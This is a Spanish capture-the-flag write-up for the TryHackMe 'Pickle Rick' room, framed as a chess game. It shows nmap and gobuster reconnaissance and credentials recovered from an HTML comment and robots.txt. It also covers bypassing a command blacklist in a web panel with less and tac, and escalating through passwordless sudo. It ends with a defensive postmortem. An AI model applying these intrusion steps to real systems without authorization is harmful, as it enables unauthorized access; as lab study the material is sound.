```
♟ PARTIDA 004
  PICKLE RICK
  TryHackMe · Easy · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> una sala temática de rick and morty.
> tres ingredientes ocultos como banderas.
> el sistema dejó las pistas en el código fuente.
> literalmente en el código fuente.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> rick and morty.
> un científico que construye cosas sin pensar en las consecuencias.
> apropiado.
```

> Esta sala tiene tema. Colores, referencias, nombre de usuario en el HTML. El equipo que la diseñó puso esfuerzo en la estética. Menos esfuerzo en no dejar el usuario en un comentario del código fuente. La narrativa de Rick Sanchez es la de alguien que construye sistemas poderosos con total descuido por las consecuencias. La máquina lo refleja bien.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC <IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2
80/tcp open  http    Apache 2.4.18
```

```bash
$ view-source:http://<IP>/

<!-- Username: R1ckRul3s -->
```

> Ahí está. En el código fuente. Sin cifrar. Sin ofuscar. Un comentario HTML con el nombre de usuario. El sistema no escondió nada: lo dejó en la primera capa que cualquiera puede ver con clic derecho.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt

/login.php     (Status: 200)
/robots.txt    (Status: 200)
```

```bash
$ cat robots.txt
> Wubbalubbadubdub
```

> Usuario en el HTML. Contraseña en robots.txt. El sistema distribuyó sus propias credenciales en dos archivos públicos. La hipótesis es directa: esas dos piezas abren el panel de login.

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ # login.php
$ usuario: R1ckRul3s
$ contraseña: Wubbalubbadubdub

> acceso concedido.
> command panel activo.
```

> Un panel de ejecución de comandos web. Sin autenticación robusta. Con el usuario y la contraseña distribuidos en archivos públicos. La posición colapsó antes del primer comando.

```bash
$ ls
  Sup3rS3cretPickl3Ingred1ent.txt
  clue.txt

$ less Sup3rS3cretPickl3Ingred1ent.txt
> mr. meeseeks hair
```

> El panel bloqueaba `cat`. No bloqueaba `less`. No bloqueaba `tac`. El filtro era una lista negra parcial: bloqueaba el comando obvio, dejaba pasar todos los equivalentes. Primer ingrediente capturado.

---

## `> ♛ REY EXPUESTO: escalada`

```bash
$ sudo -l

> (ALL : ALL) NOPASSWD: ALL
```

> El usuario web puede ejecutar cualquier comando como root sin contraseña. Sin restricciones. Sin excepciones. Eso no es una configuración descuidada: es ausencia total de configuración.

```bash
$ sudo ls /root
  3rd.txt

$ sudo less /root/3rd.txt
> [tercer ingrediente]
```

> Tres ingredientes. Tres banderas. Ninguna requirió más de dos movimientos desde el acceso inicial.

---

## `> ♚ JAQUE MATE`

```bash
$ cat ingredients.log
> ingrediente 1 → directorio raíz del servidor
> ingrediente 2 → /rick/second_ingredients
> ingrediente 3 → /root/3rd.txt

> partida completa.
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: usuario en comentario html del index
MOVIMIENTO 2: contraseña en robots.txt en texto plano
MOVIMIENTO 3: panel de comandos web sin sandboxing real
MOVIMIENTO 4: sudo sin contraseña para todos los comandos
```

> Cuatro movimientos. Cada uno independiente. Cada uno suficiente para causar daño por sí solo.
>
> El usuario en el HTML es un descuido de desarrollo: alguien dejó credenciales de prueba en producción. La contraseña en robots.txt es peor: robots.txt es público por diseño, existe para que los buscadores lo lean. El panel de comandos sin sandboxing es una decisión de arquitectura que invalida cualquier otra medida. Y sudo sin contraseña para todo es simplemente rendirse.
>
> Rick Sanchez construye portales interdimensionales sin manual de seguridad. La máquina lo representa con fidelidad.

```bash
$ echo $LESSON
> robots.txt no es un archivo privado.
> nunca fue un archivo privado.
> el nombre lo dice.
```

---

> *partida 004 · pickle rick · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  wubbalubbadubdub era la contraseña.
  y estaba en robots.txt.
  el rey se rindió antes de que empezara la partida.
-->
